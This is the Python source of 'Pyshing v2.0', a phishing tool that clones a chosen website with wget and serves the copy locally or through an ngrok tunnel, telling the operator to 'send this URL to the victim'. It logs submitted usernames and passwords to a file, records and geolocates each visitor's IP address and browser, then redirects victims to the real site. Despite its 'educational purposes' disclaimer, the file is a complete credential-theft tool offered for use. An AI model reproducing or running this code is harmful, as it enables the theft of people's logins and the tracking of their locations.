#!/usr/bin/python
'''
Name: Pyshing v2.0
Version: Python 3.9.2

--
The tool is for educational purposes
the author is not responsible for misuse of this software!
--

Website: https://igor-m-martins.github.io

Author: Igor M. Martins
'''
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import time
import subprocess
from io import BytesIO
import requests
import urllib.request
from urllib.parse import unquote
import json
import wget
import re
import os, sys

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    
    ips = []

    def run():
        try:
          port = input(BLUE+BOLD+"Port number [Default 1337]: "+ENDC)
          if not port:
            port = 1337
          httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
        
        except OSError:
            print(RED+"Adress already in use!\n"+ENDC)
            quit()

        try:
          loading = "\nInitializing ngrok reverse proxy...\n"
          if choice.upper() == 'Y':
            os.system(f'./ngrok http {port} > /dev/null &')
            for l in loading:
              time.sleep(0.1)
              sys.stdout.write(l)
              sys.stdout.flush()

            time.sleep(6)
            proc = subprocess.Popen('curl --silent http://localhost:4040/api/tunnels > tunnels.json && echo OK',shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
            out = proc.stdout.read()
            if 'OK' in out.decode('utf-8'):
              tunnel = open('tunnels.json','r')
              data = json.load(tunnel)
              address = data['tunnels'][0]
              print(BOLD+RED+f"\n[+] Send this URL to the victim: {address['public_url']}"+ENDC)
            else:
              print(RED+'[!] Error to get ngrok link, try run the script again'+ENDC)
          else:
            print(BOLD+RED+f"\n[+] Send this URL to the victim: http://0.0.0.0:{port}/"+ENDC)
          
          while True:
              print(BLUE+'\n.:: Listening on local port %s...\n'%(port)+ENDC)
              httpd.serve_forever()
        except:
          print(RED+'Error with ngrok, try again'+ENDC)
    def do_GET(self):
      self.get_ip()
      self.send_response(200)
      self.end_headers()
      file = open('site/redirect.txt','r')
      url_clone, path = Pyshing.splitUrl(file.read())
      file = open(f"site/{url_clone[2]}/{path}","r")
      readfile = file.readlines()
      file.close()

      for lines in readfile:
        self.wfile.write(lines.encode())
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def get_ip(self):
        log = str(self.headers)
        
        data = []

        for line in log.split('\n'):
          if 'User-Agent' in line:
            data.append(line.split('User-Agent: ')[1])
          
          if 'X-Forwarded-For' in line:
            global ip
            ip = line.split('X-Forwarded-For: ')[1]
            data.append(ip)


        if self.path == '/':
          if len(data) == 2:
            if data[0] not in self.ips:
              date = self.get_time()
              self.ips.append(ip)
              response = requests.get("https://geolocation-db.com/json/{}&position=true".format(ip)).json()
              geolocation = [response['country_name'],response['state'],response['city']]
              print(BOLD+RED+'[+] IP Found: '+ip+'\n[+] User-Agent: '+data[0]+'\n[+] Country: '+geolocation[0]+'\n[+] State: '+geolocation[1]+'\n[+] City: '+geolocation[2]+'\n'+ENDC)
              file = open('ips.txt','a+')
              file.write('Date: '+str(date)+' IP: '+str(ip)+' User-Agent: '+data[0]+'\n')
          else:
            print(BOLD+BLUE+'[-] IP NOT FOUND!'+'\n[+] User-Agent:',data[0],ENDC)

    def get_time(self):
        timestamp = 1545730073
        timenow = datetime.fromtimestamp(timestamp)
        return timenow

    def getCredentials(self, values):
        post = unquote(values.decode('utf-8'))
        readpost = post.strip('&')
        if 'enc' in readpost:
          print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}post.txt{GREEN} for future hash crack\n"+ENDC)
        
        forms = ['email','user','pass','encpass','enc_password'] #Possibles forms to get the credentials
        
        readpost = readpost.split('&')
        count = 0
        possibles = []
        file = open('logins.txt','a+')
        postf = open('post.txt','a+')
        postf.write(str(readpost)+'\n')
        for line in readpost:
          for c in forms:
            if c in line and re.search("^"+str(c),line):
              line = line.split('=')
              possibles.append(line[1])
              count +=1
              if count >= 2:
                print('\n' + BOLD+RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                print(f'LOGIN: {possibles[0]}\nPASSWORD: {possibles[1]}')
                print("=" * 52 + "\n"+ENDC)
                date = self.get_time()
                file.write(str(date)+' '+str(possibles)+'\n')
                count = 0
                possibles = []
                break
        self.redirect()

        file.close()

    def redirect(self):
        urlf = open('site/redirect.txt','r')
        url = urlf.readlines()[0]
        print(BLUE+f"[!] Redirecting to {url}...")
        redir = "<script>window.location.href=\"%s\"</script>" % (url)
        self.wfile.write(redir.encode())
        print('[+] Done!'+ENDC)

class Pyshing():
    def __init__(self):
        print(options)
        opt = int(input(BOLD+RED+"[pyshing]# "+ENDC))
        if opt == 1:
        	self.pageClone()
        elif opt == 2:
          global choice
          choice = input(GREEN+"Do you want use internet to attack? Y/n: [Default n] ")
          if choice.upper() == 'Y':
            print("Searching for ngrok...")
            proc = subprocess.Popen('./ngrok --version', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            proc = proc.stdout.read()
            if not 'ngrok' in proc.decode('utf-8'):
              proc = subprocess.Popen('uname -a', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
              proc = proc.stdout.read()
              print("ngrok not found, trying download")
              if 'amd64' in proc.decode('utf-8'):
                wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
                print('\nextracting...')
                os.system('unzip ngrok-stable-linux-amd64.zip')
              if 'aarch64' in proc.decode('utf-8') or 'arm64' in proc.decode('utf-8'):
                wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip')
                print('\nextracting...')
                os.system('unzip ngrok-stable-linux-arm64.zip')
              if 'aarch' in proc.decode('utf-8') or 'arm' in proc.decode('utf-8'):
                wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
                print('\nextracting...')
                os.system('unzip ngrok-stable-linux-arm.zip')

              token = input("\nEnter with your Ngrok API Token here: ")
              os.system('chmod +x ngrok')
              os.system(f'./ngrok authtoken {token}')
            
            print("[+] OK\nStarting Pyshing through the internet"+ENDC)
            SimpleHTTPRequestHandler.run()
          else:
            print("Starting Pyshing on localhost"+ENDC)
            SimpleHTTPRequestHandler.run()
        elif opt == 0:
            quit()
        else:
            print(RED+"[!] Invalid option!\n")

    def pageClone(self):
      try:
        url_clone = input('URL Clone: ')
        os.system(f'wget {url_clone} --mirror -p --convert-links -P site/ --wait=15 --user-agent="Mozilla/5.0"')
        print(BOLD+GREEN+"[+] Website copied... "+ENDC)
        file = open('site/redirect.txt', 'w')
        file.write(url_clone)
        file.close()
        Pyshing.splitUrl(url_clone)

      except OSError:
        print(RED+"[!] Error, check your internet connection\n"+ENDC)
      
      Pyshing()

    def splitUrl(url):
      url_clone = url.split('/')
      if len(url_clone) > 3 and url_clone[3] != '':
        path = url_clone[3]

      else:
        path = 'index.html'
      return url_clone,path

'''colors'''
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
BOLD = '\033[1m'
ENDC = '\033[0m'

banner = BLUE+'''
                                ,,          ,,                        
`7MM"""Mq.                    `7MM          db                        
  MM   `MM.                     MM                                    
  MM   ,M9 `7M'   `MF',pP"Ybd   MMpMMMb.  `7MM  `7MMpMMMb.   .P"Ybmmm 
  MMmmdM9    VA   ,V  8I   `"   MM    MM    MM    MM    MM  :MI  I8   
  MM          VA ,V   `YMMMa.   MM    MM    MM    MM    MM   WmmmP"   
  MM           VVV    L.   I8   MM    MM    MM    MM    MM  8M        
.JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
              ,V                                            6'     dP 
           OOb"                                             Ybmmmd'  
                                             Version: 2.0
                                             Author: Igor M. Martins\n
'''+ENDC

options = BOLD+GREEN+'''
1) Clone a Website	2) Start Server
0) Exit
'''+ENDC

if __name__ == '__main__':
  try:
    print(banner)
    Pyshing()
  except KeyboardInterrupt:
    if choice.upper() == 'Y':
      os.system('killall ngrok')
      print(GREEN+'[!] Ngrok finished'+ENDC)
    print("[!] Exit program...\n")
